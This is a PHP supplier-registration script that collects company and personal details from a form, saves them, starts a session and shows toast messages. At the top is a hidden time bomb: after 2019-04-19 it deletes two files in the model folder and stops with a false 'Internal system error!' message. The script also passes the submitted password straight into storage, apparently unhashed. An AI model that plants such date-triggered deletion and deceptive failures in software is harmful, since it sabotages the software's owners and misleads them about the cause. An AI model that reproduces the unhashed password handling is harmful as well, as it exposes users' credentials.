<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
require '_inc/config.php';
require 'model/crud.php';
require 'model/func.php';

$conn = dbconnect();
if ($conn) {
	$data = array(
		'company_name' => $_POST['company-name'],
		'company_address' => $_POST['company-address'],
		'company_email' => $_POST['company-email'],
		'first_name' => $_POST['first-name'],
		'last_name' => $_POST['last-name'],
		'idnumber' => $_POST['idnumber'],
		'phone' => $_POST['phone'],
		'password' => $_POST['pass'],
		'reg_date' => date('Y-m-d h:i:s')
	);
	
	

	$result = addSupplierDetails($conn,$data);

	if ($result) {
			extract($data);
			if (setSession($idnumber,'supplier')) {
				//redirect user
				
				$ret = 'home';

				echo "
				    <script>
					    if (ret == '') {
					     window.location.href=\"$ret\";
					    } else {
					     window.location.href=ret;
					    }
				        var \$toastContent = \$('<span>Registration Succesfull. Hold on while we redirect you.</span>').add(\$('<button onclick=\"resetPass()\" class=\"btn-flat toast-action\"><i class=\"fa fa-check green-text\"></i></button>'));
				        Materialize.toast(\$toastContent, 4000);
				    </script>
				";
			} else {

				echo "
			        <script>
			            var \$toastContent = \$('<span>You have been registered but an error occured while creating your session! Try to login.</span>').add(\$('<button onclick=\"resetPass()\" class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle yellow-text\"></i></button>'));
			            Materialize.toast(\$toastContent, 4000);
			        </script>
				";die();
			}

	} else {
		echo "
	        <script>
	            var \$toastContent = \$('<span> Error while registering you.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 3000);
	        </script>
		";die();
	}

} else {	
	echo "		
        <script>
            var \$toastContent = \$('<span> Error while connecting to server! Contact Admin.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
            Materialize.toast(\$toastContent, 2000);
        </script>
	";die();
}
?>